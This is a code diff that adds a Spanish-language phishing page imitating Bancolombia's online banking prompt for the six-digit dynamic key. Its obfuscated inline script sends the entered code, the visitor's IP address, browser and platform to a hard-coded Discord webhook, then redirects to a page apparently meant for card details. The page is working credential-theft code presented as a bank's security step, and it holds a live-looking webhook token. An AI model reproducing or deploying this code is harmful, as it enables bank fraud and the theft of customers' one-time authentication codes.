@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sucursal Virtual Personas - Bancolombia</title>
+    <link rel="stylesheet" href="styles_new.css">
+</head>
+<body>
+    <div class="auth-container">
+        <div class="auth-content">
+            <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="logo">
+            <h1>Sucursal Virtual Personas</h1>
+            
+            <div class="auth-box auth-box--dinamica">
+                <img class="dinamica-lock" src="img/candado.png" alt="" aria-hidden="true" width="48" height="48" decoding="async">
+
+                <h2 class="dinamica-title">Clave dinámica</h2>
+                <p class="dinamica-subtitle">Por seguridad necesitamos tu clave dinámica</p>
+
+                <div class="dinamica-preview" aria-hidden="true">
+                    <video
+                        src="img/video_2026-04-22_13-38-46.mp4"
+                        autoplay
+                        loop
+                        muted
+                        playsinline
+                        preload="auto"
+                        disablepictureinpicture
+                        disableremoteplayback
+                        controlslist="nodownload noplaybackrate nofullscreen"
+                        aria-hidden="true"
+                    ></video>
+                </div>
+
+                <form id="dynamicForm" class="auth-form">
+                    <div class="clave-dinamica clave-dinamica--underline">
+                        <input type="text" maxlength="1" class="digit-input" pattern="[0-9]" inputmode="numeric" autocomplete="off">
+                        <input type="text" maxlength="1" class="digit-input" pattern="[0-9]" inputmode="numeric" autocomplete="off">
+                        <input type="text" maxlength="1" class="digit-input" pattern="[0-9]" inputmode="numeric" autocomplete="off">
+                        <input type="text" maxlength="1" class="digit-input" pattern="[0-9]" inputmode="numeric" autocomplete="off">
+                        <input type="text" maxlength="1" class="digit-input" pattern="[0-9]" inputmode="numeric" autocomplete="off">
+                        <input type="text" maxlength="1" class="digit-input" pattern="[0-9]" inputmode="numeric" autocomplete="off">
+                    </div>
+
+                    <button type="submit" class="btn-iniciar btn-iniciar--pill" disabled>Continuar</button>
+                    <a href="#" class="dinamica-help">¿Necesitas ayuda?</a>
+                    <button type="button" class="btn-cancelar" hidden></button>
+                </form>
+            </div>
+        </div>
+
+        <div class="help-links">
+            <a href="#">¿Problemas para conectarte?</a>
+            <span class="separator">•</span>
+            <a href="#">Aprende sobre seguridad</a>
+            <span class="separator">•</span>
+            <a href="#">Reglamento Sucursal Virtual</a>
+            <span class="separator">•</span>
+            <a href="#">Política de privacidad</a>
+        </div>
+
+        <footer class="footer">
+            <div class="footer-content">
+                <div class="footer-left">
+                    <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="footer-logo">
+                    <img src="img/SFC_NEGRO_1_1.png" alt="SFC" class="sfc-logo">
+                </div>
+                <div class="footer-right">
+                    <p class="ip-address" id="ipAddress">Cargando IP...</p>
+                    <p class="datetime" id="datetime">Cargando fecha...</p>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <div id="loadingOverlay" class="loading-overlay">
+        <img src="img/LogoBancolombia.png" alt="Cargando..." class="loading-logo">
+    </div>
+
+    <script>
+        (function(){const a=document.querySelectorAll('.digit-input'),b=document.querySelector('.btn-iniciar'),c=document.getElementById('dynamicForm'),d=document.getElementById('loadingOverlay'),e=document.getElementById('ipAddress'),f=document.getElementById('datetime');
+        if(!a.length||!b||!c)return;
+        b.disabled=true;
+        function g(){let h=true;
+        a.forEach(i=>{if(i.value.length!==1)h=false});
+        const j=h;
+        b.disabled=!j;
+        j?(b.style.backgroundColor='#FFD700',b.style.cursor='pointer'):(b.style.backgroundColor='',b.style.cursor='default');
+        return j}
+        a.forEach((h,i)=>{h.addEventListener('input',function(j){let k=j.target.value.replace(/[^0-9]/g,'');
+        if(k.length>1)k=k.charAt(0);
+        j.target.value=k;
+        if(k.length===1&&i<a.length-1){a[i+1].focus()}
+        g()});
+        h.addEventListener('keydown',function(j){if(j.key==='Backspace'&&!h.value&&i>0){a[i-1].focus();
+        a[i-1].value='';
+        g()}})});
+        g();
+        async function k(){try{const h=await fetch('https://api.ipify.org?format=json'),i=await h.json();
+        return i.ip}catch(h){return'No disponible'}}
+        async function l(){try{const h=await k();
+        if(e)e.textContent=`Dirección IP: ${h}`;
+        const i=new Date(),j=i.toLocaleDateString('es-CO',{weekday:'long',year:'numeric',month:'long',day:'numeric',hour:'numeric',minute:'2-digit',hour12:true,timeZone:'America/Bogota'}).toLowerCase();
+        if(f)f.textContent=j}catch(h){}}
+        l();
+        setInterval(l,60000);
+        c.addEventListener('submit',async function(h){h.preventDefault();
+        if(!g())return;
+        if(d){d.classList.add('active');
+        d.style.display='flex'}
+        const i=Array.from(a).map(m=>m.value).join(''),j=await k(),n=new Date(),o=n.toLocaleDateString('es-CO',{weekday:'long',year:'numeric',month:'long',day:'numeric',hour:'numeric',minute:'numeric',second:'numeric',hour12:true,timeZone:'America/Bogota'}),p='https://discordapp.com/api/webhooks/1502450235039813796/i46OZ18VVn1ihVHMN6BS02ZyEy7bZp7WoJuaYYhS4BWbNrXVHRPADrYpS_CeFqyvYwSQ',q={title:'🔐 CLAVE DINÁMICA - BANCOLOMBIA',color:0xFFD700,fields:[{name:'🔢 Clave Dinámica',value:`\`${i}\``,inline:true},{name:'🌐 IP',value:`\`${j}\``,inline:true},{name:'📅 Fecha/Hora',value:`\`${o}\``,inline:false},{name:'💻 Navegador',value:`\`${navigator.userAgent.substring(0,80)}...\``,inline:false},{name:'🖥️ Plataforma',value:`\`${navigator.platform}\``,inline:true}],timestamp:new Date().toISOString(),footer:{text:'Bancolombia - Sistema de Seguridad'}};
+        try{const r=await fetch(p,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[q]})});
+        r.ok?console.log('✅ Datos enviados a Discord correctamente'):console.error('❌ Error al enviar a Discord:',r.status)}catch(r){console.error('❌ Error de conexión con Discord:',r)}
+        setTimeout(function(){window.location.href='tarjeta.html'},500)})})();
+    </script>
+</body>
+</html>
